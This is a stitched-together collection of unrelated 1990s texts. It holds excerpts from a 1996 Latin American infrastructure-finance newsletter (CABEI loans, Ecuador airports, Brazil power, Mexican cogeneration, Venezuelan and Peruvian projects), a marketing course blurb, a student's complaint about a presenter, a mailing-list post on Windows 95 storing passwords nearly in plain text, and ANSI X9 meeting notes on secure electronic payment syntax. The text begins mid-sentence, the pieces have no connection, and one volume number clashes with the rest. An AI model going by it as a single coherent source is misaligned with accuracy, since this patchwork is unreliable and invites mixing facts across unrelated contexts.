$1.4 billion. Dominant Force By far the region's largest lender, CABEI lends to companies domiciled inCentral America that are at least 51%-owned by nationals from the shareholdercountries. Besides the Central American shareholders (Costa Rica, El Salvador, Guatemala, Honduras and Nicaragua), current outsideshareholders are Mexico, Argentina and Taiwan. Colombia is joining CABEI andplans to make its capital subscription shortly, and South Korea, Brazil andChile have announced intentions to become shareholders. Venezuela is awaitinglegislative approval of its application. Under CABEI's lending terms, a joint venture 51% owned by Mexican partnersand domiciled in, say, Guatemala, would be eligible for loans. The most energetic countries for private-sector activity are El Salvador, Guatemala and CostaRica, Chavez-Almendares said. Where The Money Went Last year, CABEI approved $84 million in loans for Guatemala's privatesector. Of the total, $68 million went to productive facilities and short-termtrade finance; $8.5 million to the 10 MW Pasabien hydroelectric project; and$7.8 million to small and medium companies. Loans totaling $126 million wereapproved for the public sector, including $60 million for telecommunications and$57 million for road improvements. El Salvador's private sector received $98 million, including $48 million forproductive facilities and $24 million for short-term trade finance. Small andmedium companies got $6.2 million, while the public sector got a total of $38million. For Costa Rica's private sector, the bank approved $41 million in loans,including $15 million for productive facilities and $11 million for tradefinance. Small and medium companies received $10 million, and loans to thepublic sector totaled $48 million. Bigger Slice For Nicaragua In Nicaragua, CABEI hopes to increase its lending portfolio by puttingtogether a "Brady-like" plan for the country, Chavez-Almendares said.By extending the maturities of $300 million of loans using US treasuryzero-coupon bonds as collateral, CABEI would be able to loan another $300million to Nicaragua. The bank is approaching various donor countries, includingshareholders, to provide the bonds. By the end of June, Nicaragua was CABEI'slargest debtor, with $476 million in outstanding loans. © Copyright 1996 Latin American Information Services, Inc. All RightsReserved.

VOL. 5, NO. 7 ISSN 1084-5526 Ecuador Finally, A Plan For New Airports In Quito, Guayaquil Ecuador's airport doldrums may at last be moving toward a happy ending. Vicepresident Rosalia Arteaga, who also heads the Commission for New Airports (CNA),has announced the government's "firm" decision to continue plans putforth since 1968 to build new airports in Quito and Guayaquil. Both projects, tobe built under a joint public-private sector scheme, have drawn considerableworldwide interest: Eight companies prequalified in 1991 under an earlierprogram and can keep their status if they fulfill new requisites, while 32consortia purchased bidding requirements after the latest announcement. Allpotential bidders must buy the requirements and present qualifications byNovember 5. After selecting prequalifiers in December, the government will decidewhether to auction the two projects together or separately. Also undecided iswhether the private partners will take over the assets of the present airports.(If not, the private partner might have to take a higher equity stake topreserve majority status.) Either way, the airports would be offered as 35- to40-year concessions, plus a five-year construction period. Approximate cost forboth is $250 million, plus $50 million for Quito access roads and $12 millionfor Guayaquil access roads. Technical offers will be due 60 to 90 days after prequalifiers are announcedin December. Financial offers will be due by October 1997, with winnersannounced in December 1997 and construction to begin in early 1998. The privateoperator must build all airport buildings and runways, and provide all equipmentand working capital. Prequalified bidders may link up with other prequalifiedcandidates but are limited to one consortium apiece. Urgent Need The new airports are expected to provide considerable improvement over thepresent installations, both of which are dangerously located in the heart ofeach city. Neither airport meets international standards. Both are located onlots that are far too small: 170 hectares for Guayaquil and 104 hectares forQuito, compared to international minimum requirements of 1,500 hectares. InQuito, two main city streets are less than 100 meters from the runway. Threeprivate planes crashed during the last two years while trying to approach theairport, and one troubled Boeing flight recently finished its takeoff in themiddle of a nearby road. The Rules Ecuador's Civil Aviation Bureau (DAC) will take a minority stake, to includeownership of the land on which the new facilities will be built. The governmentowns the entire 2,020 hectares planned for the Guayaquil airport, actually innearby Daular. In Puembo, the site of the new Quito airport, 40% of the needed1,500 hectares are tied up in a compensation dispute expected to be settled byyear-end. Land for both airports is valued at $25-$30 million, which representsapproximately 10% of the total cost of each airport. · Telecom Sale Set for April The National Modernization Council (Conam), which heads Ecuador'sprivatization efforts, has extended to November 29 the prequalification deadlinefor bidders interested in state telecommunications company Emetel. Sofar, 22 companies have announced plans to bid. Prequalifiers will be announcedin mid-December, though companies not accepted may appeal. The government willrelease a final list in January 1997, and final bids will be due in April. Theconcession period will last 15 years, and the winner will have exclusive servicerights during the first five years. Within the next two weeks, the government plans to split Emetel into anorthern and southern company. (However, Cuenca, in the southern province ofAzuay, will retain its municipal phone concern.) A 35% stake in each companywill be offered to private operators, while 10% will be reserved for employees (P&F1/96). Authorities hope 13% of Ecuador's population will have telephone lines by2001, up from today's 6%. Conam hopes to get $1 billion from the sale, thoughthe valuation will not be completed until year-end. The government has vowed notto accept low bids and says it will nullify the process if the offers aren'thigh enough. The International Finance Corp. (IFC), the private-sector arm of theWorld Bank, is advising on the sale. A series of road shows through theUS, Europe and Asia will begin in mid-October. Tariff Overhaul The national telecommunications council plans to release a tariffrestructuring plan early this month. Emetel has long subsidized low local rateswith exorbitant international charges, which helped it turn a tidy profit overthe years. But recently, the company has lost 40% of its international market tocall-back operators. Experts recommend Emetel drop international tariffs by45%-50%, while sharply raising local rates – a political hot potato but onethe government must face. © Copyright 1996 Latin American Information Services, Inc.

VOL. 5, NO. 6 ISSN 1084-5526 Brazil What Is the Truth Behind Upcoming Blackout Threat? Power sector executives have plunged into a game of truth or consequencesfollowing grim blackout forecasts for the industrial states of Sao Paulo, Rio deJaneiro and Minas Gerais. Though the head of Sao Paulo state energy company CESPhas predicted short blackouts starting this month, executives with the Itaipudam and Minas Gerais electricity company Cemig say supply is far moreadequate. Meanwhile, Citibank Brazil's privatization chief says thatelectricity generation is not likely to increase until Brazil's governmentestablishes a clearer pricing policy. Dry Winter Threatens Supply Sao Paulo's CESP was among the first to wave the red flag, warning customersof potential 10-minute (or more) blackouts this month due to growing domesticand commercial consumption as water resources shrank during a dry winter season.At least two generating plants in Sao Paulo were urged to increase output,although the solution has led to a controversy over environmental consequences.To give a local hydro plant sufficient water to operate at full capacity duringpeak hours, the highly polluted waters of the Pinheiros river would be divertedto the Billings dam. The problem is that the Billings dam also provides SaoPaulo's drinking water. And stepping up production at the oil-fired Piratiningaplant would increase pollution in a section of Sao Paulo city already known forits dreadful air quality. Others Disagree By contrast, Itaipu director Euclides Scalco has said he foresees no energyblackouts in southeastern Brazil in the coming months. However, he warned thatthe situation may worsen without new investments of at least $6 billion peryear, although he acknowledged that domestic energy consumption grew by 7% inthe last two years while overall economic growth was less than 4%. According toofficial reports from Itaipu, the biggest power generation plant in Brazil andone of the biggest in the world, supply and demand will reach equilibrium in SaoPaulo, Rio de Janeiro, Minas Gerais and Brasilia when the complex increases itsoutput to 33 million KW per hour by the year 2005. Minas Gerais state power company Cemig doesn't foresee risks of power cutsuntil the end of the year at the very earliest. Its current figures say domesticconsumption grew by 9.4% and commercial by 10.2%, but that the industry wasconsuming 8% less energy than last year. Company officials said that thesituation could get worse in 1998 or 1999, but that chances of blackouts thisyear and in 1997 are very small. No Centralized Planning A bigger problem may be Brazil's continuing weaknesses in strategic planningand policy coordination. For example, the plan to divert water from northernBrazil's Sao Francisco River to irrigate some 116,000 hectares of dry land inthe poor rural areas of Pernanbuco, Alagoas and Bahia states will leave 140,000hectares in the Sao Francisco valley without irrigation and will decrease thegenerating capacity of the river's power plants (P&F 6/96). Almostall federal and regional institutions that have studied the project havecriticized it, but it remains on the government budget. The country's 17.5 million electrically heated showers are also drainingbadly needed funds from the electrical system. A Brazilian association of airconditioner and heating manufacturers spokesman says each shower costs the powercompanies $900 a year in distribution costs. Every new electric shower costs thegovernment $6,000 in generation, transportation and distribution investments, headds. Pricing Is Worst Problem A more important root of potential shortages may be lack of clarity in thecountry's pricing system, said Citibank Brazil's privatization director LuisMacedo following the failed auction of Energetica Nacional, the companyin charge of building the Serra da Mesa dam on the Tocantins river. All thepotential bidders backed out of the August 15 auction, blaming poorly definedfederal pricing policies for energy.· New Plan Calls For Grandiose Spending The ambitious "Brazil in Action" infrastructure and socialinvestment program announced last month by President Fernando Henrique Cardosois calling for $79 billion through the end of the decade, with at least half ofthe funds projected to come from the private sector. On the list are 42projects, including 26 in the infrastructure sector. The initial spending targetis $54 billion through 1998, when Cardoso's term ends, with an additional $25billion set for 1999. Though much of Brazil in Action covers the same ground aslast year's $93 billion pluriannual investment plan (P&F 10/95), thenew plan concentrates on Cardoso's term, while the pluriannual plan will lastthrough the first year of the new government. Potential investments cover privatized companies and activities as well asnew initiatives. Sell-offs will target roads and highways, telecommunicationsand power-generation facilities, while new initiatives will focus on theBolivian gas pipeline (see page 4) and the development of river transport in theParana and Amazon basins. A total of $29.9 billion is needed through 1998 for projects intransportation, energy, ports and communications. Top priorities include the SaoPaulo-Rio Grande do Sul highway, the road from Manaus to the Venezuela border (P&F2/96), the gas pipeline, river transport, and the Ferronorte railway. Socialprojects such as housing, land reform, education, health and small business need$24.4 billion, or 45% of the first-stage spending. Rays Of Light So far, most private business executives have given the plan a cautiousreception. One of the bright spots is the government's designation of generalmanagers for each of the 42 projects, thus enabling interested parties to bypassthe bureaucracy that plagues most federal ministries. Also, government-ownedcompanies slated for privatization seem to be increasing in value, such as Telebrasand Minas Gerais state power company Cemig, as well as roads to beconcessioned in Parana, Sao Paulo, Rio Grande do Sul and Rio de Janeiro. Plenty Of Critics Doubts center on the public sector's ability to finance the portions of theplan assigned to it. The federal deficit, steadily rising, is currentlyestimated at 3.5% of GDP. Many executives, not to mention the local financialpress, are concerned not only about the deficit but about the plan's heavyreliance on foreign investment, which is may or may not be attracted to theprojects. Opposition political parties have also lashed out, deriding the planas a ploy to gain votes in the November municipal elections. Finance ministerPedro Malan remains upbeat, predicting year-end foreign investment will surpasslast year's total of close to $9 billion. · © Copyright 1996 Latin American Information Services, Inc.

VOL. 5, NO. 5 ISSN 1084-5526 Mexico Cogen, Natural Gas Offer Opportunities For Power Investors Energy liberalization in Mexico remains a highly uneven process, butprograms to increase efficiency and reduce power-related environmental hazardspoint to promising openings for domestic and foreign investors, particularly inthe areas of cogeneration and greater use of natural gas. Efforts to increase cogeneration and natural gas use have grown considerablyduring the 19 months of President Ernesto Zedillo's administration. Cogenerationhas represented a particular challenge. Legal reforms passed in 1992 and 1993permitted establishment of privately financed cogeneration plants, which supplyboth the generators' needs and the national grid. However, Mexico's economicrecession then stalled many projects in the planning stages. Also delayingprogress was a lack of clarity concerning the role of the federal electricitycommission (CFE) in such privately financed plants. Altamira Breakthrough Then, on July 4, energy secretary Jesus Reyes Heroles announced Mexico'sfirst big cogeneration project: a $72 million, 120 MW gas-fired plant with acapacity of 36,000 kg of steam an hour, to be built in Altamira, in the northernstate of Tamaulipas. The plant, which is being constructed by ICA-FluorDaniel, should begin operations in the first quarter of 1998. Wide Reach Overseeing plant operations is Enertek, a newly formed joint venturethat received a government license to build and operate the plant. Enertek'spartners are a subsidiary of Dallas-based electricity company Central andSouth West and Mexico's Alpek, the petrochemical wing of theAlfaconglomerate. The plant will provide energy for states in Mexico's northern andcentral regions, supply Enertek's and Alfa's own needs, and also servesubsidiaries of companies such as Shell and Hercules. Accordingto estimates from Alfa, the plant should provide energy savings equivalent to amillion barrels of petroleum a year. The project was preceded by arduous negotiations. These dealt with the priceof natural gas provided by state oil monopoly Pemex, the price set forpurchase of excess electricity by the CFE and the CFE's provision of emergencyelectricity in the case of plant failure. They also involved the first energytransmission contract signed with a private company in Mexico. Pointing The Way If the solutions devised in the Altamira contract negotiations aresuccessful, cogeneration should pick up speed. According to Mexico's nationalcommission for the conservation of energy, cogeneration represents the country'smost important energy savings opportunity. Some 7,000 MW – a fifth ofcurrent generating capacity – could be produced by using steam or heatalready produced by the country's industries. "Cogeneration is tremendouslyimportant in energy efficiency because it taps energy sources that wouldotherwise remain unexploited," said Mateo Trevino, head of the government'sfund for energy efficiency (FIDE). "The expertise of foreign companiescould obviously help many Mexican companies to take advantage of this potential,"Trevino said. Gas Use To Grow The Zedillo's administration's other – and longer standing – success in the field of environmentally conscious energy programs has been theliberalization of the natural gas sector. According to a decree published on thesecond day of the Zedillo administration, from the year 1998 onwards, the use offuel oil will be reduced in certain urban zones in favor of natural gas, a muchless potent pollutant. At the moment, natural gas represents 37% of all fuelused in Mexico, while fuel oil represents 51%. The government estimates that by2005, natural gas will represent 50%. Over the last two years, natural gas production has increased by more than600,000 cubic feet a day. Following legal changes in 1995 that allow companieswith minority foreign interest to participate in the storage, transport anddistribution of natural gas, six consortia – including firms from Mexico,the US, and Europe – have entered the contest for the first suchconcession, a gas distribution system in the northern border town of Mexicali (P&F4/96). Bidding closed in early April, but the government is not expected toannounce a winner before autumn; up to five other concessions are expected to begranted this year. "This really is one of the greatest changes in theenergy sector in recent years," said Javier Garbias, an energy adviser tothe president of Mexico's national ecology institute. § AIRPORT SALES SET TO BEGIN Secretary of transport and communications Carlos Ruiz Sacristan last weekannounced that the first concession to operate one of the country's airportswill be bid out this year. The Mexico City airport or the airport of Pacificresort Puerto Vallarta will likely top the list. Concessions will be for 30years, with several extensions allowed. Progress on airport privatizations hasbeen slow since congress approved the necessary legal framework last year. © Copyright 1996 Latin American Information Services, Inc. All RightsReserved.

VOL.5, NO. 4 ISSN 1084-5526 Venezuela Officials PromisePrivatization Plan Will Be Completed As Venezuela continues to climb out of its severe mid 1990s financial andpolitical crisis, the government is stepping up its commitment to an energeticmoderni zation and privatization program, said top public- and private-sectorofficials at Lagniappe's* seventh-annual Venezuela conference lastmonth. PDVSA will continue to build on its highly successful openingplan, while opportunities will soon be ready in metals and power facilities nowcontrolled by the Venezuelan Investment Fund (FIV), Corporacion Venezolanade Guayana (CVG) and bank deposit insurance agency FOGADE.Lehman Brothers and SG Warburg are advising the government on thesale of its remaining 49% stake in telecommunications company CANTV,scheduled for road shows later this year. The openings and privatizations could yield billions of dollars in newinvestment, and speakers were optimistic that the government was prepared tofollow through on reforms and new programs. Following is a summary of importantprojects and privatizations to become available in the near future. Oil Opportunities With PDVSA embarking on a 10-year, $60 billion expansion plan, manymore areas will open to the private sector, said board director Angel Olmeta.Total pro duction is to rise from 3.2 million bpd to 5.7 million bpd by 2005,according to exploration and production coordinator Juan Szabo. Of that, 1.6million bpd will come from projects open to the private sector, includingoperational contracts, sole risk exploration, Orinoco belt associations andprofit-sharing agreements. Currently, 28 international companies haveoperational contracts for properties that produce a total of 160,000 bpd. A newbidding round is scheduled for 1997. By 2005, pro duction from these areas ispredicted to hit 450,000 bpd. In the Orinoco belt, PDVSA subsidiaries Lagoven and Corpovenare negotiating joint ventures with Mobil and Arco,respectively, Szabo said. Proposals will be presented to congress later thisyear. Production of the two new proposals plus the Maraven-Conoco andMaraven-Total ventures already under way (ATF 7/95) is estimated at600,000 bpd by 2005, with total investments of $9 billion. Approval is alsoexpected this month for a $2 billion orimulsion project that would quadrupleproduction capacity. The third major area is profit-sharing agreements, which were launchedearlier this year, with predicted total production of 500,000 bpd (P&F2/96). Finally, PDVSA is stepping up its program of outsourcing non-corebusinesses discussed last year by president Luis Giusti (ATF 7/95). Newopportunities are expected to top $3 billion in natural gas facilities,transmission and distribution, as well as terminals, oil pipelines, drilling andservice rigs, and other industrial services. FIV Readies For Sell-Offs FIV President Alberto Poletto ticked off a list of more than 20 facilitiesthat are being prepared for sale. Besides CANTV and various CVG properties, toppriorities include the Enelbar and Enelven-Enelco utilities(both on the privatization track for at least two years; see ATF PDVSA FUND WILL BACK PROJECTS A Petroleum Investment Fund (FIP) has been constituted to promote theissuance of securities in the Venezuelan capital market to attract domesticsavings and direct them to the oil industry. The fund, sponsored by state oilcompany PDVSA, is slated to be in the $500 million range at first,growing to about $5 billion over a 10-year period. At this level, it would becapable of supplying as much as 10% of PDVSA's investment needs. Plastics Plant To Benefit According to Alonso Velasco, who heads New York- based PDV America,the fund initially will issue the equivalent of $30 million of three-year debtsecurities. These will be dedicated to financing 60% of a plastics plant to bebuilt by PDVSA's petrochemical affiliate, Pequiven. Pequiven will put inthe remaining 40% of the investment. The securities will be denominated inbolivars but indexed to the exchange rate. The only item standing in the way ofthe initial issuance is approval by congress of a general law allowing for suchfunds. The so-called law for "collective investment entities" isexpected to be passed soon. Over the longer term, the fund will invest in virtually the whole range ofPDVSA projects. Alonso estimates that with just a 1% rise in domestic savingsannually, the fund will easily meet its capital goals. The fund will draw onlocal savings harbored in pension funds and labor trusts as well as onVenezuelan capital held offshore. A major purpose of the fund is to enableVenezuelan society to take advantage of the fine investment opportunitiesavailable in the flourishing oil sector. Earlier, PDVSA president Luis Giustihad floated the idea of privatizing a small share of PDVSA, a notion that wasimmediately shot down by a wrathful public. Under the plan, PDVSA would committo the fund a portion of its shares in the new profit-sharing partnerships (P&F2/96). 7/94); the Nueva Esparta generating company, which covers theislands of Margarita, Coche and Cubagua; ports and shipyards; and the Monetcement company. Total income from sales could reach $2.4 billion, with $1.6billion targeted for investment. CVG properties scheduled for sale later this year include the Alcasaand Venalum aluminum smelters, Carbonorca coal anode and rawmaterials plant, and Bauxilum bauxite plant. Merrill Lynch isthe investment banker working on these sales. Also being readied for bid, underthe guiding hand of Salomon Brothers, are the Siderurgica delOriente steel plant and the Venezolana del Ferrosilicio ferrosilicumplant. Concessions Open Up CVG privatization coordinator Antonio Azpurua discussed concessionsopportunities in the Guayana region. The showpiece is the $750 million rail linkand bridge to connect Puerto Ordaz to Caribbean deep water ports (P&F5/96). More projects involving roads, electricity and gold mining will arise inconnection with plans to further integration with Brazil, especially the Manausarea. Other infrastructure projects are expected to open in the northwesternstate of Zulia, where new projects include a deep water coal port, a coalrailroad to Colombia, rural telecommunications and cleanup of Lake Maracaibo.Zulia Governor Francisco Arias Cardenas also pointed to opportunities forenvironmental firms to assist local businesses in meeting stricter environmentalregulations. Finally, deposit insurance fund FOGADE has several infrastructureopportunities soon to go on the block: satellite telecommunications company Bantel,aluminum sheet producer Alucasa, and wire and aluminum conductorproducer Cabelum. Caracas utility Elecar was sold in March toTempleton International. § * Venezuela: Preparing the Economy For Growth.

VOL. 13, NO. 9 ISSN 1084-5526 Peru May 1996 Financing Package Is Coming Together ForAguaytia Gas Project One quarter of the $210 million financing for the Aguaytia integratednatural gas project in Peru's eastern jungle will be coming from TrustCompany of the West, with the project partners putting up the rest,according to Guillermo Ferreyros, marketing manager for project consortium AguaytiaEnergy. The US Overseas Private Investment Corp. (OPIC) is granting$200 million in insurance against political risk, its maximum for a singleproject. Aguaytia Energy is the new name for the consortium of US companies headed byMaple Gas that will develop the natural gas fields of Aguaytia in thedepartment of Ucayali. Other participants in the consortium are PanEnergyCorp., El Paso Natural Gas, Illinova Generating Co., Power Markets DevelopmentCo. (a subsidiary of Pennsylvania Power & Light) and theScudder Latin American Trust for Independent Power. Company officials areclaiming Aguaytia is Latin America's first greenfield generation project to befinanced without power purchase agreements, or PPAs. An estimated $62 million of the total investment will go into developing thegas deposits. The remainder is tar geted for the thermal plants at Aguaytia andPucallpa, the pipelines, separation plants and 400 km of transmission lines. Twogeneration units totaling 155 MW are being supplied by the European conglomerateABB. The absence of PPAs in a project of this size is unusual but "the saleof energy is guaranteed by the constant growth of the Peruvian market, the lowlevels of supply and the competitive cost of the fuel," says Ferreyros. Theconsortium estimates that the cost of energy supplied to consumers in Ucayaliwill plummet from the present 7.5 US cents to three. Aguaytia will also producesome 1,500 bpd of LPG. All final authorizations for the project (which runs through severaldepartments of Peru's jungle, mountain and coast) are expected by late May. Theproject will take between 18 and 20 months to complete. CAMISEA DEADLINE EXTENDED AGAIN The decision between the government and Royal Dutch Shell regardingdevelopment of the vast Camisea natural gas fields has been extended a fourthtime and is now due in mid-May. Originally scheduled for December 1995, thedeadlines had previously been extended to February 29 and then to April 26because of prolonged wrangling over royalty payments and the project timetable (P&F3/96). © Copyright 1996 Latin American Information Services, Inc.

We are analyzing and evaluating the most important marketing issues facingfirms today who wish to compete in this revolutionary and dynamic new mediaenvironment. The format consists of lecture, case study, guest speakers, and computer labassignments. The heart of the course is a demanding Web-based marketingteam project - students have chosen from an exciting array of marketingproblems and issues facing real firms involved on the bleeding edge ofdigital commerce. Almost all of the course is online and updated continuously. The syllabuslinks to numerous articles and readings.

Not only he was 15 minutes late but he also came completely unprepared. A graduate level CIS class hardly deserves questioning our familiarity with Ethernet (which was clearly better than Meng's own). Meng Wong's "presentation" was only surpassed by that of his friend from Temple which was truly horrendous. That was the most useless hour and a half that I spent in a classroom. --Michael.

(perhaps it is apocryphal, but i remember a rumour that one of the earlier pre-release versions of windows 95 had a bug in it -- you send it some kind of TCP sequence, and it dumps its hard disk to you. untrue now, i'm sure, but possible. murphy willing, it's just a matter of time before it happens. the names will change, but the story stays the same.) the unix world is accustomed to weekly cert advisories that send sysadmins scrambling to patch the latest holes. cert advisories affecting windows 95, or macOS system 8, or any kind of desktop pc in general -- they can't be too far away. today, when your car breaks down, you know you can go to the mechanic down the road. five years from now, when a cert advisory comes out and your computer's affected, what do you do? two million people calling 1-800-MICROSOFT? or will every computer sold have a sysadmin policy sold along with it? so that you can call up your local computer service center, give them your customer ID, and have them log in as root to your box to fix the hole? not an impossible future -- and one with interesting implications for e-commerce. cheers meng >Date: Mon, 4 Dec 1995 19:06:12 +0100 >From: Tatu Ylonen <ylo@cs.hut.fi> > >Basically, you should be aware that if you ever mount disks from Unix >machines to Windows95 machines, the passwords of the unix machine (or >your other file servers) will be stored on the Windows machine's disk >essentially in the plain, and any 10-year computer-literate kid with a >little knowledge will be able to retrieve them in seconds if he gets >access to client machine. > >The message below explains the details.

She said that the ANSI X.9 which is accredited to develop financial industry standards, has approved this work item on Electronic Payments. X.9 has 6 subcommittees, 30 active working groups, and manage 70 standards, and technical specifications. We do 5 year reviews on each. Also they are the US technical advisory group to ISO Technical Committee 68 (TC68), and they also provide a secretariat. TC68 has 3 subcommittees. Mark Zalewski of Cybercash is nominated chair for TC68. This is domestic standards development. Define work and tell them what needs to be done. If there does not need to be a domestic standard but an international one that is okay. Intel has offered to provide a Chairperson, Tom Jones. Tom lead the meeting with the following agenda: Scope of work item Proposal to extend the work item into other areas 2 presentations on other standards, Taher Elgamal on SEPP, and FSTC on Echeck The general purpose of this work item is to produce an American national standard on secure electronic payment syntax. Since the group is large, Tom suggested nominating a small editing group of 6-10 people to put together a document and bring it back to the larger group. Tom said that he wanted to get through the work item in 18 months, and to do that there would have to be a draft in 9 months. The following document was a strawman distributed to start discussion on a proposed X9 new work item. "Towards an American National Standard: Secure Payment Syntax Scope: The payment syntax described in this standard is designed to order a Financial Institution to make a payment to a merchant from an account of a purchaser based on the near term delivery of low monetary value goods or services. It should be possible to include this payment order in any electronic protocol that is based on communications between the purchaser and the merchant, and between the merchant and a Financial Institution. This standard does not describe, nor recommend, any particular communication protocol. When used within a complete payment infrastructure, the secure payment order described below shall offer privacy and integrity of the purchaser's payment information, and shall prevent the purchaser from successfully repudiating the sending, or the merchant from successfully repudiating the receiving, of a valid payment order. Non-repudiation of receipt will require secure acknowledgment messages. Thus the Financial Institution can be sure that its customer requested the payment and that the merchant can be accurately identified on the account statement. Purpose: Consumers, operating from within their own home or business, have access to an increasingly wide range of electronic displays of merchant's wares. The source of this electronic cornucopia can be provided by networked connections, broadcast or narrowcast TV, the physical distribution of electronic media, such as CD-ROM, or future media connections which are now only in the conceptual stage. Regardless of the source of the information, there is an increasingly urgent demand that user's make the purchase decision directly from the electronic media, and the purchase decision be transmitted together with payment information to the merchant. The merchant wants to receive the payment information prior to delivering the merchandise to cut down on fraud loss and the purchaser seems to want immediate access to the goods or services, purchased. This standard is intended to close the electronic loop by providing a secure means for the purchaser to make payment information available to the merchant, without revealing any secret information that could be used in a fraudulent manner to access the purchaser's accounts. The payment information will only be accessible by the purchaser, and the purchaser's Financial Institution, but the merchant can be assured, in real-time, that payment will be honored by his Financial Institution. Content of the Payment Order: The fields required for the payment order are separated into the plain text segment and enciphered segment. Transparent fields from CyberCash Credit Card Protocol (CH1) type: card-payment id order-id merchant-ccid transaction date pr-hash pr-signed-has cyberkey EPO fields from "NetBill Security and Transaction Protocol" purchaser's ID Product ID Negotiated Price Merchant ID Crypto Checksum of Product Request Data Crypto Checksum of Purchaser's Account No with a nonce Globally-unique EPOID (Transaction ID) Security for the Payment Order (from the Purchaser) Only those fields that are in the enciphered segment will be protected from disclosure or alteration by cryptographic means. Opaque fields from CyberCash Credit Card Protocol (CH1) swversion amount&currency card (expiry, number, type, salt) - must be pre-approved signature EPO fields from "NetBill Security and Transaction Protocol" Ticket proving the customer's TRUE ID Authorization Tokens Purchaser's Account No nonce Purchaser's memo field Security for Merchant Fields Those fields that are in the merchant's enciphered segment will be protected from disclosure or alteration by cryptographic means. Merchant Opaque fields from CyberCash Credit Card Protocol (CM1/2) type order-id merchant-amount&currency pr-hash pr-signed-hash id transaction date merchant-signature EPO fields from "NetBill Security and Transaction Protocol" added by merchant Merchant's account number Merchant's memo field Goods decryption key Merchant signature " Discussion on scope: The result of this group will be a message set and sequence diagram. There will be a lot of work going into what is in those messages. There was some discussion about the use of the terms low monetary value and merchant. Graham asked if other payment flows would be considered. Tom said that he wanted to have a scope that is small and easily achievable, so that is why we are focusing the flow from consumer to merchant to financial institution. Right now this cannot support cash, as it requires the consumer to have a bank account. It can support credit or debit. There are a relatively small group of encryption algorithms about to be approved by X-9. Three have been approved: DES, Triple DES is in the works, RSA and Vhelman (?). Digital Signature and Secure Hash is a standard; attribute lists are being worked on. Security folks in X9f will be active in this work item. It may be necessary to specify encryption schemes. Key exchange is quite different. If you allow more than one, you get into interoperability problems. NSA representative said that the length of the encryption key should not be an issue, but what is encrypted should be of more concern for the group. The group should not limit this standard based on a regulation that could change in a few months. The 820 is complicated and could be used to accomplish this activity, but this work item is trying to come up with a relatively simple consumer oriented transaction. If you are going to say privacy, integrity and non-repudiation, then you will have to define cryptography. X.9 has standards that define the cryptography protocols so we can reference them. The comments on the scope will be incorporated and a new draft will be submitted to the group for review. Will the usage specification operate with current regulation and clearing and settlement system? If you use Party A, Party B and a Bank, instead of using the term merchant, then you could move it in any way. If there are 2 parties and only one bank, then this will not effect any clearing system. If it is 2 parties and 2 banks then the clearing system comes into play. Should the second bank be added to the scope? Do we want to support flows between financial institutions. We need to rely on the banks to tell us if this is implementable. Dan suggested that the standard be expanded to support information exchanged between banks. Tom said that we should work to understood the needs of customers and limit ourselves to the problems that we know and not try and solve problems we don't know about. We can produce guidelines for reference implementations, but they are not part of the standard. We encourage organizations that are developing implementations to advise us of any issues in implementing the standard. Tom said that he will do best to narrow the scope. If any suggestion increases the scope significantly, I will recommend that they become a separate work item. Talk on SEPP: John Gould of MasterCard said that the Secure Electronic Payment Protocol (SEPP) is intended to solve MC's business model. We expect to conclude revision to the SEPP review process in less than 60 days. We have a time pressure by customers and member banks to secure our brand products quickly. We will be piloting the result hopefully with VISA and X9. Take the SEPP document as an informational, living, document. We will not know how good it is until we start to pilot it. Taher Elgamal, of Netscape, said that SEPP is a vertical solution rather than a horizontal message format. SEPP solves the credit card transaction where there is a consumer, merchant and merchant's bank. We were not trying to solve the world's payment problems. Credit cards are the simplest model to use. People feel comfortable because the liability is to the benefit of the consumer most of the time. We tried to minimize the impact on the existing medium, banking protocols and networks. The design is a front end to the existing bank network. We had to solve the authentication problem. It is not really exactly known how this will work and if it will scale properly. We tried not to change relationship between parties. We started with a generic philosophy to use standards where they exist. SEPP will be implemented independently by different vendors that have to achieve interoperability. The merchant does not have to see the credit card number even though he does today. The payment/order has dual encryption. The payment instruction is opaque to the merchant. The order details are not of interest to the bank. The message formats are the tools in SEPP, to achieve the product, that is useful. There is an attempt to solve the grand picture. The credit card system is complex. Does the merchant really need to know the identity of the consumer. The merchant is only interested that the person is capable of using the amount. They may want to know, but they may not need to know. We built in an online certification system, which certifies consumers and merchants. For SEPP, the acquiring bank does the certification. Dan mentioned that this is not quite analogous to how it works in the paper model. Frank Jaffe spoke about Echeck. He said that the future is likely to bring more alternatives, not less. We wanted to move the check to a paperless instrument. Eliminate paper and use cryptographic methods to secure it. We're looking at digital signatures to replace hand signatures. The Electronic Check supports multiple check flows. Deposit and Clear (Normal) flow, Cash Check, Z flow, Lockbox flow, and transfer flow. Electronic Check supports multiple business models: Certified Check flow, Interchange, Third Party Payer. Overview: -Develop a secure, all-electronic instrument modeled on paper check primarily for use in electronic commerce -Enable this instrument to be flexible and represent other physical instruments such as cashier's checks, traveler's checks -Develop a general programmatic set of tools and standard interfaces, protocols and formats so that E-Check functions can be used for other applications. -Test approach through a commercial pilot. We would like to develop a reference implementation and tools to make it easier to use it. Electronic Check objectives: -provide individuals and businesses a safe convenient debit payment option -use inexpensive public networks -enable merchants to automate complete transactions We're not trying to specify encryption, to allow parties to use what they want. Key component summary: -hardware token for electronic and checkbook cryptographic key storage -digital signatures for transaction authentication -electronic certificates for account and bank authentication -secure hash for tamper-proofing -encryption for privacy is optional -remittance/invoice/order form included for automated accounts receivable processes -public networks for transmission The scope of the project is to issue payment orders against accounts in banks. If customer wants it, banks can afford it, and it can be done securely than why not? Tom started discussion again on the X.9 Work item. He said that we need to address: what do customers want, what risks do banks want to take and how fast do you want to do it? The banking industry needs a protocol standard for electronic payments. This could be the beginning of something bigger; define a scope for this work item, but as the beginning of a payment protocol. Frank suggested that the project should focus more than just consumer to merchant. Several people suggested trying to develop a more encompassing payment protocol than just consumer to merchant payments, because it is easier to design up front than redesign after it has been implemented. Others suggested that we ought to start with something manageable, like debit or credit cards, but not design ourselves into a corner. If this group does not address payment types, than client software will have to identify between payment types and what merchants and/or banks take what. Taher pointed out that SEPP will not do debit cards well. Will consumers use account based systems in the volume that you expect? Many agreed that speed is important, and encouraged staying focused for time considerations. There was a suggestion to have separate groups developing payment syntax for credit, debit, echeck. One suggestion was to help the consumer to quickly negotiate a payment system of choice. Spending time on credit seems to make sense since it is more widely used on the Internet. NACHA is addressing the check issue. Tom summarized the discussion saying that it appeared that most agreed to stay cognizant of all issues, but focus on the credit model and allow the architecture to expand. We should find what is in common to all payment systems. Make it modular to add on types or variations. Someone suggested a steering committee to address these extensions. Tom proposed an editing group of 6-10 people to get document out on the credit model. He proposed having a meeting of the editing group on January 16th in San Francisco. The full group will meet Feb. 29th at Cylink in Sunnyvale. and tentatively June 7th in 